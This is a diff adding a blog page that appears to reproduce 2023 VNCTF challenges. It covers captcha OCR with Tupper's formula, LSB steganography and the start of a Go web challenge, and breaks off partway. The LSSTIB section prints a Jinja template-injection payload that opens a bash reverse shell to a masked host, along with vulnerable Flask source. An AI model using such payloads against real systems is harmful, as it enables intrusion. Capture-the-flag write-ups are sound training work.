@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="lhb">
+    
+    <title>
+        
+            2023VNCTF复现 |
+        
+        Jerem1ah&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/fontawesome/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/css/brands.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"/images/logo.svg","favicon":"/images/logo.svg","avatar":"/images/avatar.svg","font_size":null,"font_family":null,"hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"header_transparent":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving.","font_color":null,"hitokoto":false},"scroll":{"progress_bar":false,"percent":false}},"local_search":{"enable":false,"preload":false},"code_copy":{},"code_block":{"tools":{"enable":false,"style":"default"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":false},"lazyload":{"enable":false},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.7"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":false,"wordcount":false,"min2read":false},"img_align":"left","copyright_info":false},"version":"3.5.2"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"};
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/logo.svg">
+                </a>
+            
+            <a class="logo-title" href="/">
+               Jerem1ah&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                LINKS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">LINKS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">2023VNCTF复现</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/avatar.svg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">lhb</span>
+                            
+                                <span class="author-label">Lv4</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2023-02-26 10:41:18</span>
+        <span class="mobile">2023-02-26 10:41</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2023-02-26 16:06:29</span>
+    </span>
+    
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/ctf/">ctf</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                <h1 id="2023VNCTF复现"><a href="#2023VNCTF复现" class="headerlink" title="2023VNCTF复现"></a>2023VNCTF复现</h1><h3 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h3><p>参考wp:</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/8BjR_Hg2KZ9zAWZxIFpJAg" >https://mp.weixin.qq.com/s/8BjR_Hg2KZ9zAWZxIFpJAg<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/jyttttttt/article/details/129114207?app_version=5.14.0&amp;code=app_1562916241&amp;csdn_share_tail=%7B%22type%22:%22blog%22,%22rType%22:%22article%22,%22rId%22:%22129114207%22,%22source%22:%22jyttttttt%22%7D&amp;uLinkId=usr1mkqgl919blen&amp;utm_source=app" >https://blog.csdn.net/jyttttttt/article/details/129114207?app_version=5.14.0&amp;code=app_1562916241&amp;csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22129114207%22%2C%22source%22%3A%22jyttttttt%22%7D&amp;uLinkId=usr1mkqgl919blen&amp;utm_source=app<i class="fas fa-external-link-alt"></i></a></p>
+<p>evalgo : <a class="link"   target="_blank" rel="noopener" href="https://www.gem-love.com/2022/07/25/goeval%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#undefined" >https://www.gem-love.com/2022/07/25/goeval%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#undefined<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="2-VNCTF-misc-验证码"><a href="#2-VNCTF-misc-验证码" class="headerlink" title="2.VNCTF-misc-[验证码]"></a>2.VNCTF-misc-[验证码]</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python31 -m pip install ddddocr -i https://pypi.tuna.tsinghua.edu.cn/simple/</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import ddddocr</span><br><span class="line"></span><br><span class="line">res = &quot;&quot;</span><br><span class="line">ocr = ddddocr.DdddOcr()</span><br><span class="line">for i in range(136):</span><br><span class="line">    with open(f&#x27;imgs/&#123;i&#125;.png&#x27;,&#x27;rb&#x27;) as img:</span><br><span class="line">       code = ocr.classification(img.read())</span><br><span class="line"></span><br><span class="line">       print(code)</span><br><span class="line">       res += code</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1594199391770250354455183081054802631580554590456781276981302978243348088576774816981145460077422136d47780972200375212293357383685099969525103172039o4288891813962796668464579304272444795430837394840340487326283747092360113915630466853830405781934371350o158029312192443296076902692735780417298059011568971988619463802818660736654o49870484193411780158317168232187100668526865378478661078082oo9408188033574841574337151898932291631715135266804518790328831268881702387643369637508117317249879868707531954723945940226278368605203277838681081840279552</span><br></pre></td></tr></table></figure>
+
+<p>将期中的错误识别字母改为数字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1594199391770250354455183081054802631580554590456781276981302978243348088576774816981145460077422136047780972200375212293357383685099969525103172039042888918139627966684645793042724447954308373948403404873262837470923601139156304668538304057819343713500158029312192443296076902692735780417298059011568971988619463802818660736654049870484193411780158317168232187100668526865378478661078082009408188033574841574337151898932291631715135266804518790328831268881702387643369637508117317249879868707531954723945940226278368605203277838681081840279552</span><br></pre></td></tr></table></figure>
+
+<p>tupper</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://tuppers-formula.ovh/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/19VNCTF2023%E5%A4%8D%E7%8E%B0/image-20230226104605096.png" alt="image-20230226104605096"></p>
+<h3 id="3-VNCTF-misc-LSSTIB"><a href="#3-VNCTF-misc-LSSTIB" class="headerlink" title="3.VNCTF-misc-[LSSTIB]"></a>3.VNCTF-misc-[LSSTIB]</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Created on Sun May 19 11:20:05 2019</span><br><span class="line">@author: Administrator</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def plus(string):</span><br><span class="line">    # Python zfill() 方法返回指定长度的字符串，原字符串右对齐，前面填充0。</span><br><span class="line">    return string.zfill(8)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_key(strr):</span><br><span class="line">    # 获取要隐藏的文件内容</span><br><span class="line">    with open(strr, &quot;rb&quot;) as f:</span><br><span class="line">        s = f.read()</span><br><span class="line">        string = &quot;&quot;</span><br><span class="line">        for i in range(len(s)):</span><br><span class="line">         # 逐个字节将要隐藏的文件内容转换为二进制，并拼接起来</span><br><span class="line">         # 1.先用ord()函数将s的内容逐个转换为ascii码</span><br><span class="line">         # 2.使用bin()函数将十进制的ascii码转换为二进制</span><br><span class="line">         # 3.由于bin()函数转换二进制后，二进制字符串的前面会有&quot;0b&quot;来表示这个字符串是二进制形式，所以用replace()替换为空</span><br><span class="line">         # 4.又由于ascii码转换二进制后是七位，而正常情况下每个字符由8位二进制组成，所以使用自定义函数plus将其填充为8位</span><br><span class="line">            string = string+&quot;&quot;+plus(bin(s[i]).replace(&#x27;0b&#x27;, &#x27;&#x27;))</span><br><span class="line">    # print(string)</span><br><span class="line">    return string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def mod(x, y):</span><br><span class="line">    return x % y</span><br><span class="line"></span><br><span class="line"># str1为载体图片路径，str2为隐写文件，str3为加密图片保存的路径</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def func(str1, str2, str3):</span><br><span class="line">    im = Image.open(str1)</span><br><span class="line">    # 获取图片的宽和高</span><br><span class="line">    width, height = im.size[0], im.size[1]</span><br><span class="line">    print(&quot;width:&quot;+str(width))</span><br><span class="line">    print(&quot;height:&quot;+str(height))</span><br><span class="line">    count = 0</span><br><span class="line">    # 获取需要隐藏的信息</span><br><span class="line">    key = get_key(str2)</span><br><span class="line">    keylen = len(key)</span><br><span class="line">    for h in range(height):</span><br><span class="line">        for w in range(width):</span><br><span class="line">            pixel = im.getpixel((w, h))</span><br><span class="line">            a = pixel[0]</span><br><span class="line">            b = pixel[1]</span><br><span class="line">            c = pixel[2]</span><br><span class="line">            if count == keylen:</span><br><span class="line">                break</span><br><span class="line">            # 下面的操作是将信息隐藏进去</span><br><span class="line">            # 分别将每个像素点的RGB值余2，这样可以去掉最低位的值</span><br><span class="line">            # 再从需要隐藏的信息中取出一位，转换为整型</span><br><span class="line">            # 两值相加，就把信息隐藏起来了</span><br><span class="line">            a = a-mod(a, 2)+int(key[count])</span><br><span class="line">            count += 1</span><br><span class="line">            if count == keylen:</span><br><span class="line">                im.putpixel((w, h), (a, b, c))</span><br><span class="line">                break</span><br><span class="line">            b = b-mod(b, 2)+int(key[count])</span><br><span class="line">            count += 1</span><br><span class="line">            if count == keylen:</span><br><span class="line">                im.putpixel((w, h), (a, b, c))</span><br><span class="line">                break</span><br><span class="line">            c = c-mod(c, 2)+int(key[count])</span><br><span class="line">            count += 1</span><br><span class="line">            if count == keylen:</span><br><span class="line">                im.putpixel((w, h), (a, b, c))</span><br><span class="line">                break</span><br><span class="line">            if count % 3 == 0:</span><br><span class="line">                im.putpixel((w, h), (a, b, c))</span><br><span class="line">    im.save(str3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 原图</span><br><span class="line">    old = &quot;6src/flag.png&quot;</span><br><span class="line">    # 处理后输出的图片路径</span><br><span class="line">    new = &quot;6src/flag_encode.png&quot;</span><br><span class="line">    # 需要隐藏的信息</span><br><span class="line">    enc = &quot;6src/1.txt&quot;</span><br><span class="line">    func(old, enc, new)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;10*10&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/xx.xxx.xx.xx/7780 0&gt;&amp;1&quot;&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">touch test</span><br><span class="line">find test -exec cat /flag \;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/19VNCTF2023%E5%A4%8D%E7%8E%B0/image-20230226152818917.png" alt="image-20230226152818917"></p>
+<p>怎么能就这样结束了呢doge，传了个mshell.elf，吧一些文件下载到了本地</p>
+<p>题目文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:.</span><br><span class="line">└─app</span><br><span class="line">    │  .DS_Store</span><br><span class="line">    │  app.py</span><br><span class="line">    │  lsb.py</span><br><span class="line">    │  requirements.txt</span><br><span class="line">    │</span><br><span class="line">    ├─static</span><br><span class="line">    │      normalize.css</span><br><span class="line">    │      style.css</span><br><span class="line">    │</span><br><span class="line">    └─templates</span><br><span class="line">            index.html</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from flask import *</span><br><span class="line">import os</span><br><span class="line">from lsb import lsb_decode</span><br><span class="line"></span><br><span class="line">app = Flask(__name__, static_folder=&#x27;static&#x27;, static_url_path=&#x27;/static&#x27;)</span><br><span class="line">app.config[&#x27;ALLOWED_EXTENSIONS&#x27;] = &#123;&#x27;png&#x27;&#125; </span><br><span class="line"></span><br><span class="line">def allowed_file(filename):</span><br><span class="line">    return &#x27;.&#x27; in filename and \</span><br><span class="line">           filename.rsplit(&#x27;.&#x27;, 1)[1] in app.config[&#x27;ALLOWED_EXTENSIONS&#x27;]</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return redirect(&#x27;/upload&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/upload&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def upload_file():</span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        f = request.files[&#x27;file&#x27;]</span><br><span class="line">        if f and allowed_file(f.filename):</span><br><span class="line">            return render_template_string(lsb_decode(f))</span><br><span class="line">        else:</span><br><span class="line">            return &#x27;This is not a Upload challenge!!!\nPlz Upload right png!!!&#x27;</span><br><span class="line">    else:</span><br><span class="line">        return render_template(&#x27;index.html&#x27;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=5000)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">import numpy as np</span><br><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line"></span><br><span class="line">def lsb_decode(pic):</span><br><span class="line">    pic_data = np.array(Image.open(pic).convert(&#x27;RGB&#x27;))</span><br><span class="line">    a,b,c = pic_data.shape</span><br><span class="line">    # print(a,b,c)# a:y b:x</span><br><span class="line">    res_data = pic_data.reshape(a*b*c)</span><br><span class="line">    data = &#x27;&#x27;.join(str(i%2) for i in res_data)</span><br><span class="line">    res = &#x27;&#x27;.join(chr(int(data[i:i+8],2)) for i in range(0,len(data),8))</span><br><span class="line">    return res</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;L1near的LSB加密日志上传&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;static/normalize.css&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;static/style.css&quot; media=&quot;screen&quot; type=&quot;text/css&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;section class=&quot;webdesigntuts-workshop&quot;&gt;</span><br><span class="line">&lt;form action = &quot;/upload&quot; method = &quot;POST&quot; enctype = &quot;multipart/form-data&quot;&gt;</span><br><span class="line">     &lt;input type = &quot;file&quot; name = &quot;file&quot; /&gt;</span><br><span class="line">     &lt;input type = &quot;submit&quot; value=&quot;上传(仅允许PNG)&quot;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/section&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">css 就不放了</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Flask</span><br><span class="line">pillow</span><br><span class="line">numpy</span><br><span class="line">pycrypto</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-VNCTF-web-babygo"><a href="#4-VNCTF-web-babygo" class="headerlink" title="4.VNCTF-web-[babygo]"></a>4.VNCTF-web-[babygo]</h3><p>题目：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;encoding/gob&quot;</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">	&quot;github.com/PaulXu-cn/goeval&quot;</span><br><span class="line">	&quot;github.com/duke-git/lancet/cryptor&quot;</span><br><span class="line">	&quot;github.com/duke-git/lancet/fileutil&quot;</span><br><span class="line">	&quot;github.com/duke-git/lancet/random&quot;</span><br><span class="line">	&quot;github.com/gin-contrib/sessions&quot;</span><br><span class="line">	&quot;github.com/gin-contrib/sessions/cookie&quot;</span><br><span class="line">	&quot;github.com/gin-gonic/gin&quot;</span><br><span class="line">	&quot;net/http&quot;</span><br><span class="line">	&quot;os&quot;</span><br><span class="line">	&quot;path/filepath&quot;</span><br><span class="line">	&quot;strings&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">type User struct &#123;</span><br><span class="line">	Name  string</span><br><span class="line">	Path  string</span><br><span class="line">	Power string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	r := gin.Default()</span><br><span class="line">	store := cookie.NewStore(random.RandBytes(16))</span><br><span class="line">	r.Use(sessions.Sessions(&quot;session&quot;, store))</span><br><span class="line">	r.LoadHTMLGlob(&quot;template/*&quot;)</span><br><span class="line"></span><br><span class="line">	r.GET(&quot;/&quot;, func(c *gin.Context) &#123;</span><br><span class="line">		userDir := &quot;/tmp/&quot; + cryptor.Md5String(c.ClientIP()+&quot;VNCTF2023GoGoGo~&quot;) + &quot;/&quot;</span><br><span class="line">		session := sessions.Default(c)</span><br><span class="line">		session.Set(&quot;shallow&quot;, userDir)</span><br><span class="line">		session.Save()</span><br><span class="line">		fileutil.CreateDir(userDir)</span><br><span class="line">		gobFile, _ := os.Create(userDir + &quot;user.gob&quot;)</span><br><span class="line">		user := User&#123;Name: &quot;ctfer&quot;, Path: userDir, Power: &quot;low&quot;&#125;</span><br><span class="line">		encoder := gob.NewEncoder(gobFile)</span><br><span class="line">		encoder.Encode(user)</span><br><span class="line">		if fileutil.IsExist(userDir) &amp;&amp; fileutil.IsExist(userDir+&quot;user.gob&quot;) &#123;</span><br><span class="line">			c.HTML(200, &quot;index.html&quot;, gin.H&#123;&quot;message&quot;: &quot;Your path: &quot; + userDir&#125;)</span><br><span class="line">			return</span><br><span class="line">		&#125;</span><br><span class="line">		c.HTML(500, &quot;index.html&quot;, gin.H&#123;&quot;message&quot;: &quot;failed to make user dir&quot;&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	